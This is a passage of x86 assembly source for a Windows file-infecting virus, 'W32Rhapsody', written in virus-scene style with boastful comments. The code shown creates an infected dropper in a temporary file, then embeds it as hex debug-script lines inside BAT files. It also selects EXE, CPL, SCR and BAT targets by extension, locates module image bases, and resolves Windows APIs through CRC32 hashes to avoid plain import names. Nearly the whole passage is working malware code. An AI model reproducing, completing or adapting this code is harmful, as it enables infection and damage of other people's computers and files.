           xchg    eax,edi

   ; LSCE_UnPack
   unpack_loop:
           lodsb                                   ; 1 byte
           or      al,al                           ; 2 bytes
           jnz     store_byte                      ; 2 bytes
           dec     ecx                             ; 1 byte
           dec     ecx                             ; 1 byte
           lodsw                                   ; 2 bytes
           cwde                                    ; 1 byte
       push    ecx                             ; 1 byte
       xor     ecx,ecx                         ; 2 bytes
       xchg    eax,ecx                         ; 1 byte
       rep     stosb                           ; 2 bytes
       pop     ecx                             ; 1 byte
       test    al,00h                          ; 1 byte
       org     $-1
   store_byte:
       stosb                                   ; 1 byte
           loop    unpack_loop                     ; 2 bytes

           push    00h                             ; Create the dropper on
           push    80h                             ; a temporal file called
           push    02h                             ; RHAPSODY.W32 (that will be
           push    00h                             ; erased later)
           push    01h
           push    40000000h
           lea     edi,temp_file d
       push    edi
           call    CreateFileA d

       push    eax                             ; Write it, sucka!

           push    00h
           lea     ebx,iobytes d
       push    ebx
           push    1000h
           push    dword ptr [ebp+(GlobalAllocHandle3-delta)]
       push    eax
           call    WriteFile d

           call    CloseHandle d

           push    dword ptr [ebp+(GlobalAllocHandle3-delta)]
           call    GlobalFree d

           lea     edi,temp_file d                 ; Infect dr0pped file
           call    InfectPE

           push    00h                             ; Open the infected dr0pper
           push    80h                             ; (again) but now for R/W
           push    03h
           push    00h
           push    01h
           push    0C0000000h
           lea     edi,temp_file d
       push    edi
           call    CreateFileA d

           mov     FileHandle3 d,eax

           push    00h
           push    eax
           call    GetFileSize d

           xchg    eax,ebx
           mov     InfDropperSize d,ebx

   ; EBX = infected dr0pper size

           push    ebx
           push    00h
           call    GlobalAlloc d                   ; Another allocation
           mov     GlobalAllocHandle3 d,eax

           push    00h                             ; Write there the infected
           lea     ecx,NumOfBytesWritten d         ; dropper code
           push    ecx
           push    ebx
           push    eax
           push    dword ptr [ebp+(FileHandle3-delta)]
           call    ReadFile d

           push    dword ptr [ebp+(FileHandle3-delta)]
           call    CloseHandle d

   ; BAT infection, part 3

           mov     edi,MapAddress2 d               ; EDI = Ptr to infected BAT

           lea     esi,bat_inf1 d                  ; Write first part of the
           push    n_bat_inf1                      ; new BAT
           pop     ecx
           rep     movsb

           mov     esi,GlobalAllocHandle3 d        ; ESI = Ptr to infected dr0pper

           mov     ecx,InfDropperSize d
           shr     ecx,04h                         ; divide per 10

           pushad
           shl     ecx,04h                         ; x/10*10 ... for round up :)
           xchg    ecx,eax                         ; in EAX
           lea     edi,src_bytes d                 ; EDI ptr to bytes to write
           call    HexWrite16                      ; Convert&Write!
           popad

           xor     edx,edx                         ; Starting with 100h ;)
           inc     dh

   sixteen_bytes_written_loop:
           push    ecx
           mov     ax," E"                         ; Write E
           stosw
           mov     eax,edx                         ; E xxxx
           call    HexWrite16

           push    10h
           pop     ecx
   write_row:
           mov     al," "                          ; Write space
           stosb

           lodsb
           call    HexWrite8

           loop    write_row

           mov     ax,0A0Dh
           stosw

           add     edx,10h
           pop     ecx
           loop    sixteen_bytes_written_loop

           push    dword ptr [ebp+(GlobalAllocHandle3-delta)]
           call    GlobalFree d                    ; Free some mem

           lea     esi,bat_inf2 d                  ; Write second BAT part
           push    n_bat_inf2
           pop     ecx
           rep     movsb

           mov     esi,GlobalAllocHandle d         ; Let's write the old bat code
           mov     ecx,12345678h
   Size2I  equ     $-4
           rep     movsb

           xchg    edx,edi
           sub     edx,dword ptr [ebp+(MapAddress2-delta)]

           pushad

           push    dword ptr [ebp+(MapAddress2-delta)]
           call    UnmapViewOfFile d

           push    dword ptr [ebp+(MapHandle2-delta)]
           call    CloseHandle d

           popad

           xor     eax,eax
           push    eax
           push    eax
           push    edx
           push    dword ptr [ebp+(FileHandle2-delta)]
           call    SetFilePointer d

           push    dword ptr [ebp+(FileHandle2-delta)]
           call    SetEndOfFile d

           push    dword ptr [ebp+(GlobalAllocHandle-delta)]
           call    GlobalFree d

           jmp     CloseAndExitInfectBAT

   UnMap&CloseMap&FileExitInfectBAT:
           push    dword ptr [ebp+(MapAddress2-delta)]
           call    UnmapViewOfFile d

   CloseMap&FileExitInfectBAT:
           push    dword ptr [ebp+(MapHandle2-delta)]
           call    CloseHandle d

   CloseAndExitInfectBAT:
           push    dword ptr [ebp+(FileHandle2-delta)]
           call    CloseHandle d
   ExitInfectBAT:
           lea     edi,temp_file d
           push    edi
           call    DeleteFileA d
           ret

   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]
   ; [ Miscellaneous routines                                                  ]
   ; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]

   ; input:
   ;       EDI - Where store converted number
   ;       EAX - Number to convert
   ; output:
   ;       Nothing.


   HexWrite16:
           push    eax
           xchg    al,ah
           call    HexWrite8
           pop     eax

   HexWrite8:
           mov     ah,al                           ; Mmm... routines stolen from
           and     al,0Fh                          ; borland...cut'n'paste rocks!
           shr     ah,4                            ; ;)
           or      ax,3030h                        ; Blargh, they are shitty
           xchg    al,ah                           ; optimized, even locally. I
           cmp     ah,39h                          ; Fixed a bit that local opt.
           ja      @@4                             ; but it's still unoptimized
   @@1:    cmp     al,39h                          ; structurally... AAAGH! :)
           ja      @@3
   @@2:    stosw
           ret
   @@3:    add     al,("A"-10)-30h
           jmp     @@2
   @@4:    add     ah,("A"-10)-30h
           jmp     @@1

   ; input:
   ;       EDI - File name to analyze
   ; output:
   ;       ECX - 00 -> Unknown file
   ;             01 -> PE file
   ;             02 -> BAT file

   AnalyzeFileName:
           push    edi
           xor     ecx,ecx
           xor     al,al
           scasb
           jnz     $-1
           mov     eax,dword ptr [edi-5]
           or      eax,20202020h
           cmp     eax,"exe."
           jz      ItWasEXE
           cmp     eax,"lpc."
           jz      ItWasEXE
           cmp     eax,"rcs."
           jz      ItWasEXE
           cmp     eax,"tab."
           jnz     ItIsUnknown
   ItWasBAT:
           inc     ecx
   ItWasEXE:
           inc     ecx
   ItIsUnknown:
           pop     edi
           ret

   ; input:
   ;       ECX - Search limit
   ;       ESI - Where to begin
   ; output:
   ;       ESI - Module's imagebase if succesful
   ;       ECX - 0 if fail

   CheckImageBase:
           and     esi,0FFFF0000h
           cmp     word ptr [esi],"ZM"
           jz      ItWasKewlEnough
   NotCoolAddress:
           sub     esi,00010000h
           loop    CheckImageBase
   ItWasKewlEnough:
           ret

   ; input:
   ;       ESI - Pointer to the code to process
   ;       EDI - Size of such code
   ; output:
   ;       EAX - CRC32 of that code

   CRC32:
       cld
           pushad
       xor     ecx,ecx                         ; Optimized by me - 2 bytes
       dec     ecx                             ; less
       mov     edx,ecx
   NextByteCRC:
       xor     eax,eax
       xor     ebx,ebx
       lodsb
       xor     al,cl
       mov     cl,ch
       mov     ch,dl
       mov     dl,dh
       mov     dh,8
   NextBitCRC:
       shr     bx,1
       rcr     ax,1
       jnc     NoCRC
       xor     ax,08320h
       xor     bx,0EDB8h
   NoCRC:  dec     dh
       jnz     NextBitCRC
       xor     ecx,eax
       xor     edx,ebx
       dec     edi                             ; Another fool byte less
       jnz     NextByteCRC
       not     edx
       not     ecx
       mov     eax,edx
       rol     eax,16
       mov     ax,cx
           mov     [esp.PUSHAD_EAX],eax
           popad
       ret

   ; input:
   ;       EAX - Base address of the library where search the APIs
   ;       ECX - Numbers of APIs to search
   ;       ESI - Pointer to an array of CRC32 of the APIs we want to search
   ;       EDI - Pointer to where store the APIs

   GetAPIs:
       push    eax                             ; EAX = Handle of module
           pop     dword ptr [ebp+(TmpModuleBase-delta)]
   APIS33K:
       lodsd                                   ; Get in EAX the CRC32 of API
           push    ecx esi edi
       call    GetAPI_ET_CRC32
           pop     edi esi ecx
       stosd                                   ; Save in [EDI] the API address
           loop    APIS33K
       ret

   ; input:
   ;       EAX - CRC32 of the API we want to know its address
   ; output:
   ;       EAX - API address

   GetAPI_ET_CRC32:
       xor     edx,edx
       xchg    eax,edx                         ; Put CRC32 of da api in EDX
           mov     word ptr [ebp+(Counter-delta)],ax
           push    3Ch
           pop     esi
           add     esi,TmpModuleBase d             ; Get PE header of module
       lodsw
           add     eax,TmpModuleBase d             ; Normalize

           push    1Ch
           pop     esi
           add     esi,[eax+78h]                   ; Get a pointer to its edata
           add     esi,TmpModuleBase d

           lea     edi,AddressTableVA d            ; Pointer to the address table
       lodsd                                   ; Get AddressTable value
           add     eax,TmpModuleBase d             ; Normalize
       stosd                                   ; And store in its variable

       lodsd                                   ; Get NameTable value
           add     eax,TmpModuleBase d             ; Normalize
       push    eax                             ; Put it in stack
       stosd                                   ; Store in its variable

       lodsd                                   ; Get OrdinalTable value
           add     eax,TmpModuleBase d             ; Normalize
       stosd                                   ; Store

       pop     esi                             ; ESI = NameTable VA

   @?_3:   lodsd                                   ; Get pointer to an API name
           push    esi                             ; Save again
           add     eax,TmpModuleBase d             ; Normalize
       xchg    edi,eax                         ; Store ptr in EDI
       mov     ebx,edi                         ; And in EBX

       push    edi                             ; Save EDI
           xor     al,al
           scasb
           jnz     $-1
       pop     esi                             ; ESI = Pointer to API Name

       sub     edi,ebx                         ; EDI = API Name size

       push    edx                             ; Save API's CRC32
       call    CRC32                           ; Get actual api's CRC32
       pop     edx                             ; Restore API's CRC32
       cmp     edx,eax                         ; Are them equal?
       jz      @?_4                            ; if yes, we got it

       pop     esi                             ; Restore ptr to api name
           inc     word ptr [ebp+(Counter-delta)]  ; And increase the counter
       jmp     @?_3                            ; Get another api!
   @?_4:
       pop     esi                             ; Remove shit from stack
           movzx   eax,word ptr [ebp+(Counter-delta)] ; AX = Counter
       shl     eax,1                           ; *2 (it's an array of words)
           add     eax,OrdinalTableVA d            ; Normalize
       xchg    eax,esi                         ; ESI = Ptr 2 ordinal; EAX = 0
       lodsw                                   ; Get ordinal in AX
       cwde                                    ; Clear MSW of EAX
       shl     eax,2                           ; And with it we go to the
           add     eax,AddressTableVA d            ; AddressTable (array of
       xchg    esi,eax                         ; dwords)
       lodsd                                   ; Get Address of API RVA
           add     eax,TmpModuleBase d             ; and normalize!! That's it!
       ret

           db      10d dup (?)

   virus_end               label   byte

   api_addresses           label   byte
   FindFirstFileA          dd      00000000h
   FindNextFileA           dd      00000000h
   FindClose               dd      00000000h
   CreateFileA             dd      00000000h
   DeleteFileA             dd      00000000h
   SetFilePointer          dd      00000000h
   SetFileAttributesA      dd      00000000h
   CloseHandle             dd      00000000h
   GetCurrentDirectoryA    dd      00000000h
   SetCurrentDirectoryA    dd      00000000h
   GetWindowsDirectoryA    dd      00000000h
   GetSystemDirectoryA     dd      00000000h
   CreateFileMappingA      dd      00000000h
   MapViewOfFile           dd      00000000h
   UnmapViewOfFile         dd      00000000h
   SetEndOfFile            dd      00000000h
   GetFileSize             dd      00000000h
   ReadFile                dd      00000000h
   WriteFile               dd      00000000h
   CreateThread            dd      00000000h
   ExitThread              dd      00000000h
   WaitForSingleObject     dd      00000000h
   GlobalAlloc             dd      00000000h
   GlobalFree              dd      00000000h

   iobytes                 dd      5 dup (00000000h)

   MAX_PATH                equ     260

   FILETIME                STRUC
   FT_dwLowDateTime        dd      ?
   FT_dwHighDateTime       dd      ?
   FILETIME                ENDS

   WIN32_FIND_DATA         label   byte
   WFD_dwFileAttributes    dd      ?
   WFD_ftCreationTime      FILETIME ?
   WFD_ftLastAccessTime    FILETIME ?
   WFD_ftLastWriteTime     FILETIME ?
   WFD_nFileSizeHigh       dd      ?
   WFD_nFileSizeLow        dd      ?
   WFD_dwReserved0         dd      ?
   WFD_dwReserved1         dd      ?
   WFD_szFileName          db      MAX_PATH dup (?)
   WFD_szAlternateFileName db      13 dup (?)
               db      03 dup (?)

   temp_bat_header         db      n_bat_inf1 dup (00h)

   current_directory       db      7Fh dup (00h)
   infection_directory     db      7Fh dup (00h)

   heap_end        label   byte

   Rhapsody        ends

   PUSHAD_EDI      equ     00h
   PUSHAD_ESI      equ     04h
   PUSHAD_EBP      equ     08h
   PUSHAD_ESP      equ     0Ch
   PUSHAD_EBX      equ     10h
   PUSHAD_EDX      equ     14h
   PUSHAD_ECX      equ     18h
   PUSHAD_EAX      equ     1Ch

   PUSHAD_SIZE     equ     20h
   PUSHFD_SIZE     equ     04h

   end     W32Rhapsody
